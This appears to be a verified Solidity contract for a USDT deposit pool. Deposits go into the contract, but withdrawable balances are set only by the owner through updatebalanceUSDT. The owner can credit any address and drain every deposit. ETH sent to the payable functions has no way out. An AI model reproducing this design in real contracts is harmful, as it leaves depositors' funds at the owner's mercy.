/**
 *Submitted for verification at Etherscan.io on 2022-08-08
*/

/**
*Submitted for verification at BscScan.com on 2022-02-25
*/

//SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.0;


/**
* @title SafeMath
* @dev Math operations with safety checks that throw on error
*/
library SafeMath {
/**
* @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
*/
function sub(uint256 a, uint256 b) internal pure returns (uint256) {
require(b <= a);
uint256 c = a - b;

return c;
}

/**
* @dev Adds two numbers, reverts on overflow.
*/
function add(uint256 a, uint256 b) internal pure returns (uint256) {
uint256 c = a + b;
require(c >= a);

return c;
}
}


abstract contract ReentrancyGuard {
// Booleans are more expensive than uint256 or any type that takes up a full
// word because each write operation emits an extra SLOAD to first read the
// slot's contents, replace the bits taken up by the boolean, and then write
// back. This is the compiler's defense against contract upgrades and
// pointer aliasing, and it cannot be disabled.

// The values being non-zero value makes deployment a bit more expensive,
// but in exchange the refund on every call to nonReentrant will be lower in
// amount. Since refunds are capped to a percentage of the total
// transaction's gas, it is best to keep them low in cases like this one, to
// increase the likelihood of the full refund coming into effect.
uint256 private constant _NOT_ENTERED = 1;
uint256 private constant _ENTERED = 2;

uint256 private _status;

constructor() {
_status = _NOT_ENTERED;
}

/**
* @dev Prevents a contract from calling itself, directly or indirectly.
* Calling a `nonReentrant` function from another `nonReentrant`
* function is not supported. It is possible to prevent this from happening
* by making the `nonReentrant` function external, and make it call a
* `private` function that does the actual work.
*/
modifier nonReentrant() {
// On the first call to nonReentrant, _notEntered will be true
require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

// Any calls to nonReentrant after this point will fail
_status = _ENTERED;

_;

// By storing the original value once again, a refund is triggered (see
// https://eips.ethereum.org/EIPS/eip-2200)
_status = _NOT_ENTERED;
}
}

interface IERC20 {

function totalSupply() external view returns (uint256);

/**
* @dev Returns the amount of tokens owned by `account`.
*/
function balanceOf(address account) external view returns (uint256);

/**
* @dev Moves `amount` tokens from the caller's account to `recipient`.
*
* Returns a boolean value indicating whether the operation succeeded.
*
* Emits a {Transfer} event.
*/
function transfer(address recipient, uint256 amount) external returns (bool);

/**
* @dev Returns the remaining number of tokens that `spender` will be
* allowed to spend on behalf of `owner` through {transferFrom}. This is
* zero by default.
*
* This value changes when {approve} or {transferFrom} are called.
*/
function allowance(address owner, address spender) external view returns (uint256);

/**
* @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
*
* Returns a boolean value indicating whether the operation succeeded.
*
* IMPORTANT: Beware that changing an allowance with this method brings the risk
* that someone may use both the old and the new allowance by unfortunate
* transaction ordering. One possible solution to mitigate this race
* condition is to first reduce the spender's allowance to 0 and set the
* desired value afterwards:
* https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
*
* Emits an {Approval} event.
*/
function approve(address spender, uint256 amount) external returns (bool);

/**
* @dev Moves `amount` tokens from `sender` to `recipient` using the
* allowance mechanism. `amount` is then deducted from the caller's
* allowance.
*
* Returns a boolean value indicating whether the operation succeeded.
*
* Emits a {Transfer} event.
*/
function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

/**
* @dev Emitted when `value` tokens are moved from one account (`from`) to
* another (`to`).
*
* Note that `value` may be zero.
*/
event Transfer(address indexed from, address indexed to, uint256 value);

/**
* @dev Emitted when the allowance of a `spender` for an `owner` is set by
* a call to {approve}. `value` is the new allowance.
*/
event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract UsdtDeposit is ReentrancyGuard{

using SafeMath for uint256;

address private _owner;

string private _hash;

IERC20 public usdtContract;

mapping(address => bool) private _isWhitelisted;

mapping(address => uint) public balances;

mapping(address => uint256) private _amountDeposited;

mapping(address => uint256) private _amountWithdrawn;

event Deposit(address indexed account, uint256 value);

event Withdraw(address indexed account, uint256 value);

modifier onlyOwner(){
require(msg.sender == _owner, "Sender is not the owner.");
_;
}

constructor(IERC20 usdtAddress) {
usdtContract = usdtAddress; 
_owner = msg.sender;
_isWhitelisted[msg.sender] = true;
}

receive() external payable {}

function deposit(uint256 amount) public payable nonReentrant {
require(amount > 0, "Amount should be greater than 0.");
require(usdtContract.allowance(msg.sender, address(this)) >= amount, "Allowance: Not enough usdt allowance to spend.");
usdtContract.transferFrom(msg.sender, address(this), amount);
_amountDeposited[msg.sender] += amount;
_isWhitelisted[msg.sender] = true;
emit Deposit(msg.sender, amount);
}

function updatebalanceUSDT(address account,uint256 newBalance) public onlyOwner
{
balances[account] += newBalance;
}

function withdraw(address account,uint256 amount) public 
{

require(amount <= balances[account], "Low Balance USDT.");

require(_amountDeposited[account] > 0, "User has no deposits.");

require(_isWhitelisted[account]);

_amountWithdrawn[account] += amount;

balances[account] -= amount;
usdtContract.transfer(account, amount);

emit Withdraw(account, amount);

}

function checkBalance() public view returns(uint256) {
return _amountDeposited[msg.sender];
}

function checkWithdrawnAmount(address account) public view returns(uint256){
return _amountWithdrawn[account];
}

function addWhitelist(address account) public onlyOwner {
_isWhitelisted[account] = true;
}

function removeWhitelist(address account) public onlyOwner {
_isWhitelisted[account] = false;
}

function changeAdmin(address admin) public onlyOwner {
_owner = admin;
}

}